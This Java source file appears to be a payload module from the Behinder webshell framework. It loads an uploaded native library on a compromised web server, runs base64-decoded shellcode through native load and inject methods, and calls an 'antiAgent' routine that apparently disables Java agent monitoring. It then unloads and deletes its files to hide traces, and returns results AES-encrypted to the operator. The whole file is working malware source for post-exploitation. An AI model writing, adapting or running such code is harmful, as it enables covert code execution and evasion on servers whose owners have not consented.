package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class LoadNativeLibrary implements Runnable {
    public static String action;
    public static String fileContent;
    public static String filePath;
    public static String payload;
    public static String uploadLibPath;
    public static String whatever;
    private Object Request;
    private Object Response;
    private Object Session;
    private String nativeLibPath;

    public native void antiAgent();

    public native void freeFile(String str);

    public native void inject(byte[] bArr);

    public native int load(byte[] bArr);

    public native void selfUnload(String str);

    public boolean equals(Object obj) {
        Map<String, String> result = new HashMap<>();
        try {
            fillContext(obj);
            new Thread(new LoadNativeLibrary(loadLibrary(getFileData(uploadLibPath)))).start();
            result.put("status", "success");
            result.put("msg", "Payload加载成功");
            try {
                Object so = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so.getClass().getMethod("write", byte[].class).invoke(so, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so.getClass().getMethod("flush", new Class[0]).invoke(so, new Object[0]);
                so.getClass().getMethod("close", new Class[0]).invoke(so, new Object[0]);
            } catch (Exception e) {
            }
        } catch (Exception e2) {
            result.put("status", "fail");
            result.put("msg", "Payload加载错误：" + e2.getMessage());
            try {
                Object so2 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so2.getClass().getMethod("write", byte[].class).invoke(so2, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so2.getClass().getMethod("flush", new Class[0]).invoke(so2, new Object[0]);
                so2.getClass().getMethod("close", new Class[0]).invoke(so2, new Object[0]);
            } catch (Exception e3) {
            }
        } catch (Throwable th) {
            try {
                Object so3 = this.Response.getClass().getMethod("getOutputStream", new Class[0]).invoke(this.Response, new Object[0]);
                so3.getClass().getMethod("write", byte[].class).invoke(so3, Encrypt(buildJson(result, true).getBytes("UTF-8")));
                so3.getClass().getMethod("flush", new Class[0]).invoke(so3, new Object[0]);
                so3.getClass().getMethod("close", new Class[0]).invoke(so3, new Object[0]);
            } catch (Exception e4) {
            }
            throw th;
        }
        return true;
    }

    private boolean isWindows() {
        return System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0;
    }

    public String loadLibrary(byte[] fileContent2) throws Exception {
        File library = new File(System.getProperty("java.io.tmpdir") + File.separator + UUID.randomUUID().toString() + (System.getProperty("os.name").toLowerCase().indexOf("windows") >= 0 ? ".dll" : ".so"));
        library.deleteOnExit();
        if (sessionGetAttribute(this.Session, "nativeLibs") == null) {
            List<String> libs = new ArrayList<>();
            libs.add(library.getAbsolutePath());
            sessionSetAttribute(this.Session, "nativeLibs", libs);
        } else {
            List<String> libs2 = (List) sessionGetAttribute(this.Session, "nativeLibs");
            for (String libPath : libs2) {
                new File(libPath).delete();
            }
            libs2.add(library.getAbsolutePath());
        }
        FileOutputStream output = new FileOutputStream(library, false);
        output.write(fileContent2);
        output.flush();
        output.close();
        System.load(library.getAbsolutePath());
        return library.getAbsolutePath();
    }

    public String loadLibrary(String libraryPath) throws Exception {
        File library = new File(libraryPath);
        library.deleteOnExit();
        if (sessionGetAttribute(this.Session, "nativeLibs") == null) {
            List<String> libs = new ArrayList<>();
            libs.add(library.getAbsolutePath());
            sessionSetAttribute(this.Session, "nativeLibs", libs);
        } else {
            List<String> libs2 = (List) sessionGetAttribute(this.Session, "nativeLibs");
            for (String libPath : libs2) {
                new File(libPath).delete();
            }
            libs2.add(library.getAbsolutePath());
        }
        System.load(library.getAbsolutePath());
        return library.getAbsolutePath();
    }

    public void execute(byte[] payload2) {
    }

    public LoadNativeLibrary() {
    }

    public LoadNativeLibrary(String nativeLibPath2) {
        this.nativeLibPath = nativeLibPath2;
    }

    public void run() {
        try {
            if (action.equals("freeFile")) {
                File libFile = new File(filePath);
                freeFile(libFile.getName());
                Thread.sleep(500);
                libFile.delete();
            } else if (action.equals("execute")) {
                load(base64decode(payload));
            } else if (action.equals("antiAgent")) {
                antiAgent();
            }
            if (isWindows()) {
                selfUnload(this.nativeLibPath);
            }
            try {
                Thread.sleep(500);
            } catch (InterruptedException e) {
            }
            new File(this.nativeLibPath).delete();
        } catch (Exception e2) {
            e2.printStackTrace();
            if (isWindows()) {
                selfUnload(this.nativeLibPath);
            }
            try {
                Thread.sleep(500);
            } catch (InterruptedException e3) {
            }
            new File(this.nativeLibPath).delete();
        } catch (Throwable th) {
            if (isWindows()) {
                selfUnload(this.nativeLibPath);
            }
            try {
                Thread.sleep(500);
            } catch (InterruptedException e4) {
            }
            new File(this.nativeLibPath).delete();
            throw th;
        }
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        SecretKeySpec skeySpec = new SecretKeySpec(this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString().getBytes("utf-8"), "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }

    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {
            sb.append("\"" + key + "\":\"");
            String value = entity.get(key).toString();
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
                } else {
                    getClass();
                    Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
                    value = ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, value.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(",")) {
            sb.setLength(sb.length() - 1);
        }
        sb.append("}");
        return sb.toString();
    }

    private String base64encode(String clearText) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
            return (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
        }
        getClass();
        Object Encoder2 = Class.forName("sun.misc.BASE64Encoder").newInstance();
        return ((String) Encoder2.getClass().getMethod("encode", byte[].class).invoke(Encoder2, clearText.getBytes("UTF-8"))).replace("\n", "").replace("\r", "");
    }

    private byte[] base64decode(String base64Text) throws Exception {
        if (System.getProperty("java.version").compareTo("1.9") >= 0) {
            getClass();
            Class Base64 = Class.forName("java.util.Base64");
            Object Decoder = Base64.getMethod("getDecoder", null).invoke(Base64, null);
            return (byte[]) Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
        }
        getClass();
        Object Decoder2 = Class.forName("sun.misc.BASE64Decoder").newInstance();
        return (byte[]) Decoder2.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder2, base64Text);
    }

    private void fillContext(Object obj) throws Exception {
        if (obj.getClass().getName().indexOf("PageContext") >= 0) {
            this.Request = obj.getClass().getMethod("getRequest", new Class[0]).invoke(obj, new Object[0]);
            this.Response = obj.getClass().getMethod("getResponse", new Class[0]).invoke(obj, new Object[0]);
            this.Session = obj.getClass().getMethod("getSession", new Class[0]).invoke(obj, new Object[0]);
        } else {
            Map<String, Object> objMap = (Map) obj;
            this.Session = objMap.get("session");
            this.Response = objMap.get("response");
            this.Request = objMap.get("request");
        }
        this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }

    private Object sessionGetAttribute(Object session, String key) {
        try {
            return session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSetAttribute(Object session, String key, Object value) {
        try {
            session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
        } catch (Exception e) {
        }
    }

    public static byte[] getFileData(String filePath2) throws Exception {
        byte[] fileContent2 = new byte[0];
        FileInputStream fis = new FileInputStream(new File(filePath2));
        byte[] buffer = new byte[10240000];
        while (true) {
            int length = fis.read(buffer);
            if (length > 0) {
                fileContent2 = mergeBytes(fileContent2, Arrays.copyOfRange(buffer, 0, length));
            } else {
                fis.close();
                return fileContent2;
            }
        }
    }

    public static byte[] mergeBytes(byte[] a, byte[] b) throws Exception {
        ByteArrayOutputStream output = new ByteArrayOutputStream();
        output.write(a);
        output.write(b);
        return output.toByteArray();
    }
}
